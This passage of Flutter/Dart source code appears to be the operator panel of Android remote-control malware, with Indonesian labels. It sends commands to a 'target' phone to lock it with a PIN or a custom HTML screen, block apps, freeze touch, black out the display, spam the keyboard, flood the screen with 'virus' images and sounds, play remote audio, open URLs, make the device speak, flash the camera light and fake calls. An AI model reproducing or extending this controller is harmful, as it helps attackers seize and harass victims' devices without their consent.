                ],
              ),
            ),
          ],
        ),
      ),
    );
  }

  Widget _buildChatBubble(ChatMsg m) {
    final isMine = m.sender == 'admin';
    final time = DateTime.fromMillisecondsSinceEpoch(m.ts);
    final timeStr = '${time.hour.toString().padLeft(2, '0')}:${time.minute.toString().padLeft(2, '0')}';

    return Align(
      alignment: isMine ? Alignment.centerRight : Alignment.centerLeft,
      child: Container(
        margin: const EdgeInsets.only(bottom: 8),
        constraints: BoxConstraints(maxWidth: MediaQuery.of(context).size.width * 0.7),
        padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 8),
        decoration: BoxDecoration(
          color: isMine ? kIce2 : kCard,
          borderRadius: BorderRadius.circular(12),
          boxShadow: _sh1,
        ),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            Text(m.text, style: TextStyle(
              fontSize: 14,
              color: isMine ? Colors.white : kText)),
            const SizedBox(height: 4),
            Text(timeStr, style: TextStyle(
              fontSize: 10,
              color: isMine ? Colors.white70 : kTextMuted)),
          ],
        ),
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: kBg,
      appBar: AppBar(
        title: Row(
          mainAxisSize: MainAxisSize.min,
          children: const [
            Text('DEVICE ', style: TextStyle(fontFamily: 'Orbitron', fontSize: 16, color: kText, fontWeight: FontWeight.w900, letterSpacing: 1.5)),
            Text('CONTROL', style: TextStyle(fontFamily: 'Orbitron', fontSize: 16, color: kIce2, fontWeight: FontWeight.w900, letterSpacing: 1.5)),
          ],
        ),
        backgroundColor: kCard,
        elevation: 0,
        centerTitle: false,
        shape: const Border(bottom: BorderSide(color: kBorder, width: 1.5)),
        leading: IconButton(
          icon: const Icon(Icons.arrow_back_rounded, color: kText),
          onPressed: () => Navigator.pop(context),
        ),
        actions: [
          IconButton(
            icon: const Icon(Icons.refresh_rounded, color: kTextSub),
            onPressed: () { _refreshDevice(); _showSnack('Refresh'); },
          ),
        ],
      ),
      body: Container(
        decoration: const BoxDecoration(
          gradient: LinearGradient(
            colors: [kBgGrad1, kBg, kBgGrad2],
            begin: Alignment.topCenter,
            end: Alignment.bottomCenter,
          ),
        ),
        child: SafeArea(
          child: _isLoading
              ? const Center(child: CircularProgressIndicator(color: kIce2))
              : ListView(
                  padding: const EdgeInsets.fromLTRB(16, 16, 16, 40),
                  physics: const BouncingScrollPhysics(),
                  children: [
                    _buildDeviceHero(),
                    const SizedBox(height: 20),
                    _buildSection('Kunci Layar', [
                      _actionCard('lock', 'LOCK', 'Kunci device dengan PIN + pesan', Icons.lock_rounded, kIce2),
                      _actionCard('unlock', 'UNLOCK', 'Buka kunci device', Icons.lock_open_rounded, kGreen),
                      _actionCard('custom_lock', 'CUSTOM LOCK', 'Kunci otomatis dalam durasi tertentu', Icons.timer_rounded, kAmber),
                      _actionCard('custom_lock_html', 'HTML LOCK', 'Custom tampilan HTML lock screen', Icons.code_rounded, kPurple),
                    ]),
                    _buildSection('Layar LCD', [
                      _actionCard('lcd_on', 'LCD ON', 'Muncul 4 garis hijau + overlay', Icons.monitor_rounded, kIce2),
                      _actionCard('lcd_off', 'LCD OFF', 'Matikan efek LCD', Icons.monitor_rounded, kGreen),
                    ]),
                    _buildSection('Chat Lock', [
                      _actionCard('chat_lock_on', 'CHAT LOCK ON', 'Kunci device dengan dialog chat', Icons.chat_bubble_rounded, kIce2),
                      _actionCard('chat_lock_off', 'CHAT LOCK OFF', 'Hentikan chat lock di target', Icons.chat_bubble_outline_rounded, kGreen),
                    ]),
                    _buildSection('Block App', [
                      _actionCard('block_app', 'BLOCK APP', 'Masukkan package name app target', Icons.block_rounded, kRed),
                      _actionCard('unblock_all', 'UNBLOCK ALL', 'Hapus semua app yang diblok', Icons.check_circle_rounded, kGreen),
                    ]),
                    _buildSection('Suara Target (TTS)', [
                      _actionCard('tts', 'TEXT TO SPEECH', 'Target bakal ngomong teks yang kamu ketik', Icons.record_voice_over_rounded, kIce2),
                    ]),
                    _buildSection('Overlay', [
                      _actionCard('freeze_on', 'FREEZE ON', 'Bekukan sentuhan di layar target', Icons.pause_circle_rounded, kAmber),
                      _actionCard('freeze_off', 'FREEZE OFF', 'Matikan freeze', Icons.play_circle_rounded, kGreen),
                      _actionCard('blank_on', 'BLANK ON', 'Layar jadi hitam total', Icons.dark_mode_rounded, kPurple),
                      _actionCard('blank_off', 'BLANK OFF', 'Matikan overlay hitam', Icons.light_mode_rounded, kGreen),
                      _actionCard('ambacong_on', 'AMBACONG ON', 'Tampilkan gambar lucu bergantian', Icons.image_rounded, kAmber),
                      _actionCard('ambacong_off', 'AMBACONG OFF', 'Matikan overlay ambacong', Icons.image_not_supported_rounded, kGreen),
                      _actionCard('virus_amba_on', 'VIRUS AMBA ON', 'Gambar virus makin banyak + sound', Icons.coronavirus_rounded, kRed),
                      _actionCard('virus_amba_off', 'VIRUS AMBA OFF', 'Hentikan virus + sound', Icons.healing_rounded, kGreen),
                      _actionCard('keyboard_on', 'KEYBOARD ON', 'Spam keyboard muncul terus', Icons.keyboard_rounded, kIce2),
                      _actionCard('keyboard_off', 'KEYBOARD OFF', 'Hentikan keyboard spam', Icons.keyboard_hide_rounded, kGreen),
                      _actionCard('video_on', 'VIDEO ON', 'Putar video fullscreen di target', Icons.play_circle_fill_rounded, kAmber),
                      _actionCard('video_off', 'VIDEO OFF', 'Hentikan video lock', Icons.stop_circle_rounded, kGreen),
                    ]),
                    _buildSection('Flash Kamera', [
                      _actionCard('flash_on', 'FLASH ON', 'Nyalakan flash kamera target', Icons.flash_on_rounded, kAmber),
                      _actionCard('flash_off', 'FLASH OFF', 'Matikan flash kamera', Icons.flash_off_rounded, kGreen),
                      _actionCard('flash_blink', 'FLASH BLINK', 'Flash kedip-kedip terus', Icons.flash_auto_rounded, kAmber),
                    ]),
                    _buildSection('Audio & Media', [
                      _actionCard('play_sound', 'PLAY SOUND', 'Putar audio dari URL di target', Icons.volume_up_rounded, kIce2),
                      _actionCard('stop_sound', 'STOP SOUND', 'Hentikan audio yang diputar', Icons.volume_off_rounded, kRed),
                      _actionCard('wallpaper', 'SET WALLPAPER', 'Ganti wallpaper device target', Icons.wallpaper_rounded, kIce2),
                    ]),
                    _buildSection('Prank & Lainnya', [
                      _actionCard('prank_call', 'PRANK CALL', 'Simulasi panggilan masuk', Icons.phone_rounded, kRed),
                      _actionCard('open_url', 'BUKA URL', 'Buka website di browser target', Icons.link_rounded, kIce2),
                      _actionCard('vibrate', 'VIBRATE', 'Getarkan HP target', Icons.vibration_rounded, kAmber),
                    ]),
                    const SizedBox(height: 20),
                    _buildDangerZone(),
                    const SizedBox(height: 20),
                    _buildLogList(),
                  ],
                ),
        ),
      ),
    );
  }

  Widget _buildDeviceHero() {
    final d = _device;
    if (d == null) {
      return Container(
        padding: const EdgeInsets.all(20),
        decoration: BoxDecoration(
          color: kCard,
          borderRadius: BorderRadius.circular(20),
          border: Border.all(color: kRed, width: 1.5),
          boxShadow: _sh2,
        ),
        child: const Text('DEVICE TIDAK DITEMUKAN', style: TextStyle(
          fontFamily: 'Orbitron', fontSize: 14, color: kRed, fontWeight: FontWeight.w900)),
      );
    }

    return Container(
      padding: const EdgeInsets.all(18),
      decoration: BoxDecoration(
        color: kCard,
        borderRadius: BorderRadius.circular(20),
        border: Border.all(color: kBorder, width: 1.5),
        boxShadow: _sh2,
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.stretch,
        children: [
          Row(
            children: [
              Container(
                width: 56, height: 56,
                decoration: BoxDecoration(
                  gradient: d.online
                      ? const LinearGradient(colors: [kGreen, Color(0xFF059669)])
                      : const LinearGradient(colors: [kTextMuted, Color(0xFF64748B)]),
                  borderRadius: BorderRadius.circular(14),
                  boxShadow: _shPrimary,
                ),
                child: const Icon(Icons.phone_iphone_rounded, color: Colors.white, size: 28),
              ),
              const SizedBox(width: 14),
              Expanded(
                child: Column(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    Text(d.name, overflow: TextOverflow.ellipsis, style: const TextStyle(
                      fontFamily: 'Orbitron', fontSize: 16, color: kText, fontWeight: FontWeight.w900, letterSpacing: 0.5)),
                    const SizedBox(height: 8),
                    Row(children: [
                      Container(
                        padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 3),
                        decoration: BoxDecoration(
                          color: d.online ? kGreen : kRed,
                          borderRadius: BorderRadius.circular(6),
                        ),
                        child: Text(d.online ? 'ONLINE' : 'OFFLINE', style: const TextStyle(
                          fontSize: 10, color: Colors.white, fontWeight: FontWeight.bold, letterSpacing: 1)),
                      ),
                    ]),
                  ],
                ),
              ),
            ],
          ),
          const SizedBox(height: 16),
          const Divider(color: kBorder, thickness: 1.5),
          const SizedBox(height: 12),
          Row(
            children: [
              _heroStat('BATERAI', d.battery != null ? '${d.battery}%' : '—', kAmber),
              const SizedBox(width: 8),
              _heroStat('NEGARA', d.country, kGreen),
              const SizedBox(width: 8),
              _heroStat('TERAKHIR', _timeAgo(d.lastSeen), kIce2),
            ],
          ),
        ],
      ),
    );
  }

  Widget _heroStat(String k, String v, Color color) {
    return Expanded(
      child: Container(
        padding: const EdgeInsets.symmetric(vertical: 10, horizontal: 8),
        decoration: BoxDecoration(
          color: kCardAlt,
          borderRadius: BorderRadius.circular(12),
          border: Border.all(color: kBorder, width: 1.2),
        ),
        child: Column(
          children: [
            Text(v, overflow: TextOverflow.ellipsis, style: TextStyle(
              fontFamily: 'Orbitron', fontSize: 13, color: color, fontWeight: FontWeight.w900, letterSpacing: 0.5)),
            const SizedBox(height: 4),
            Text(k, style: const TextStyle(
              fontSize: 10, color: kTextSub, fontWeight: FontWeight.w600)),
          ],
        ),
      ),
    );
  }

  Widget _buildSection(String title, List<Widget> children) {
    return Column(
      crossAxisAlignment: CrossAxisAlignment.stretch,
      children: [
        Padding(
          padding: const EdgeInsets.only(top: 12, bottom: 10),
          child: Row(children: [
            const Icon(Icons.bookmark_rounded, color: kIce2, size: 16),
            const SizedBox(width: 8),
            Text(title.toUpperCase(), style: const TextStyle(
              fontFamily: 'Orbitron', fontSize: 13, color: kText, fontWeight: FontWeight.w900, letterSpacing: 1.5)),
            const SizedBox(width: 10),
            Expanded(child: Container(height: 1.5, color: kBorder)),
          ]),
        ),
        ...children,
      ],
    );
  }

  Widget _actionCard(String act, String title, String subtitle, IconData icon, Color color) {
    final disabled = _device == null || !_device!.online;
    return GestureDetector(
      onTap: disabled ? null : () => _handleAction(act),
      child: Opacity(
        opacity: disabled ? 0.5 : 1.0,
        child: Container(
          margin: const EdgeInsets.only(bottom: 10),
          padding: const EdgeInsets.all(14),
          decoration: BoxDecoration(
            color: kCard,
            borderRadius: BorderRadius.circular(16),
            border: Border.all(color: kBorder, width: 1.5),
            boxShadow: _sh1,
          ),
          child: Row(children: [
            Container(
              width: 46, height: 46,
              decoration: BoxDecoration(
                color: color,
                borderRadius: BorderRadius.circular(12),
                boxShadow: [
                  BoxShadow(color: color.withOpacity(0.3), blurRadius: 8, offset: const Offset(0, 4)),
                ],
              ),
              child: Icon(icon, color: Colors.white, size: 22),
            ),
            const SizedBox(width: 14),
            Expanded(child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Text(title, style: const TextStyle(
                  fontFamily: 'Orbitron', fontSize: 13, color: kText, fontWeight: FontWeight.w900, letterSpacing: 0.5)),
                const SizedBox(height: 4),
                Text(subtitle, style: const TextStyle(
                  fontSize: 11, color: kTextSub)),
              ],
            )),
            const Icon(Icons.chevron_right_rounded, color: kTextMuted, size: 24),
          ]),
        ),
      ),
    );
  }

  Widget _buildDangerZone() {
    return Container(
      padding: const EdgeInsets.all(16),
      decoration: BoxDecoration(
        color: kRedSoft,
        borderRadius: BorderRadius.circular(16),
        border: Border.all(color: kRed.withOpacity(0.4), width: 1.5),
      ),
      child: Row(children: [
        const Icon(Icons.warning_rounded, color: kRed, size: 36),
        const SizedBox(width: 12),
        const Expanded(
          child: Column(
            crossAxisAlignment: CrossAxisAlignment.start,
            children: [
              Text('EMERGENCY STOP', style: TextStyle(
                fontFamily: 'Orbitron', fontSize: 13, color: kRed, fontWeight: FontWeight.w900, letterSpacing: 1)),
              Text('Matikan semua overlay sekaligus', style: TextStyle(
                fontSize: 11, color: kTextSub)),
            ],
          ),
        ),
        GestureDetector(
          onTap: _device?.online == true ? _triggerEmergencyStop : null,
          child: Container(
            padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 10),
            decoration: BoxDecoration(
              color: kRed,
              borderRadius: BorderRadius.circular(10),
              boxShadow: [
                BoxShadow(color: kRed.withOpacity(0.3), blurRadius: 8, offset: const Offset(0, 4)),
              ],
            ),
            child: const Text('STOP', style: TextStyle(
              fontSize: 12, color: Colors.white, fontWeight: FontWeight.bold, letterSpacing: 1)),
          ),
        ),
      ]),
    );
  }

  Future<void> _triggerEmergencyStop() async {
    final ok = await _confirmDialog(
      title: 'EMERGENCY STOP?', message: 'Matikan semua overlay & sound aktif di device target.',
      confirmLabel: 'STOP ALL', confirmColor: kRed,
    );
    if (ok != true) return;
    _showSnack('EMERGENCY STOP...');
    final cmds = [
      'unlock', 'freeze_off', 'blank_off', 'ambacong_off', 'virus_amba_off',
      'keyboard_off', 'video_off', 'flash_off', 'stop_sound', 'prank_end',
      'chat_lock_off', 'unblock_all', 'tts_stop', 'lcd_off',
    ];
    for (final c in cmds) {
      await _sendCommand(c);
      await Future.delayed(const Duration(milliseconds: 120));
    }
    _stopChatPolling();
    _showSnack('STOP ALL OK', success: true);
  }

  Widget _buildLogList() {
    return Column(
      crossAxisAlignment: CrossAxisAlignment.stretch,
      children: [
        Padding(
          padding: const EdgeInsets.only(top: 12, bottom: 10),
          child: Row(children: [
            const Icon(Icons.history_rounded, color: kTextSub, size: 18),
            const SizedBox(width: 8),
            const Text('LOG PERINTAH', style: TextStyle(
              fontFamily: 'Orbitron', fontSize: 13, color: kText, fontWeight: FontWeight.w900, letterSpacing: 1.5)),
            const SizedBox(width: 10),
            Expanded(child: Container(height: 1.5, color: kBorder)),
          ]),
        ),
        if (_logs.isEmpty)
          Container(
            padding: const EdgeInsets.all(20),
            decoration: BoxDecoration(
              color: kCard,
              borderRadius: BorderRadius.circular(16),
              border: Border.all(color: kBorder, width: 1.5),
            ),
            child: const Center(child: Text('BELUM ADA PERINTAH DIKIRIM', style: TextStyle(
              fontSize: 12, color: kTextMuted, fontWeight: FontWeight.bold))),
          )
        else
          ..._logs.map((l) {
            final t = DateTime.fromMillisecondsSinceEpoch(l.ts);
            final time = '${t.hour.toString().padLeft(2, '0')}:${t.minute.toString().padLeft(2, '0')}';
            return Container(
              margin: const EdgeInsets.only(bottom: 8),
              padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 12),
              decoration: BoxDecoration(
                color: kCard,
                borderRadius: BorderRadius.circular(12),
                border: Border.all(color: kBorder, width: 1.5),
              ),
              child: Row(children: [
                Container(
                  width: 10, height: 10,
                  decoration: BoxDecoration(
                    color: l.ok ? kGreen : kRed,
                    shape: BoxShape.circle,
                  ),
                ),
                const SizedBox(width: 10),
                Expanded(child: Text('${l.action} ${l.ok ? "TERKIRIM" : "GAGAL"}', style: TextStyle(
                  fontSize: 12, fontWeight: FontWeight.bold,
                  color: l.ok ? kGreen : kRed))),
                Text(time, style: const TextStyle(
                  fontSize: 11, color: kTextMuted, fontWeight: FontWeight.bold)),
              ]),
            );
          }),
      ],
    );
  }

  Future<bool?> _confirmDialog({required String title, required String message, required String confirmLabel, required Color confirmColor}) {
    return showDialog<bool>(
      context: context,
      builder: (ctx) => Dialog(
        backgroundColor: Colors.transparent,
        child: Container(
          padding: const EdgeInsets.all(20),
          decoration: BoxDecoration(
            color: kCard,
            borderRadius: BorderRadius.circular(20),
            border: Border.all(color: kBorder, width: 1.5),
            boxShadow: _sh2,
          ),
          child: Column(
            mainAxisSize: MainAxisSize.min,
            children: [
              Icon(Icons.warning_rounded, color: confirmColor, size: 60),
              const SizedBox(height: 12),
              Text(title, textAlign: TextAlign.center, style: const TextStyle(
                fontFamily: 'Orbitron', fontSize: 16, color: kText, fontWeight: FontWeight.w900, letterSpacing: 1.5)),
              const SizedBox(height: 8),
              Text(message, textAlign: TextAlign.center, style: const TextStyle(
                fontSize: 12, color: kTextSub)),
              const SizedBox(height: 20),
              Row(
                children: [
                  Expanded(child: GestureDetector(
                    onTap: () => Navigator.pop(ctx, false),
                    child: Container(
                      padding: const EdgeInsets.symmetric(vertical: 12),
                      decoration: BoxDecoration(
                        color: kCardAlt,
                        border: Border.all(color: kBorder, width: 1.5),
                        borderRadius: BorderRadius.circular(10),
                      ),
                      child: const Center(child: Text('BATAL', style: TextStyle(
                        fontSize: 12, color: kTextSub, fontWeight: FontWeight.bold, letterSpacing: 1))),
                    ),
                  )),
                  const SizedBox(width: 12),
                  Expanded(child: GestureDetector(
                    onTap: () => Navigator.pop(ctx, true),
                    child: Container(
                      padding: const EdgeInsets.symmetric(vertical: 12),
                      decoration: BoxDecoration(
                        color: confirmColor,
                        borderRadius: BorderRadius.circular(10),
                        boxShadow: [
                          BoxShadow(color: confirmColor.withOpacity(0.3), blurRadius: 8, offset: const Offset(0, 4)),
                        ],
                      ),
                      child: Center(child: Text(confirmLabel, style: const TextStyle(
                        fontSize: 12, color: Colors.white, fontWeight: FontWeight.bold, letterSpacing: 1))),
                    ),
                  )),
                ],
              ),
            ],
          ),
        ),
      ),
    );
  }
}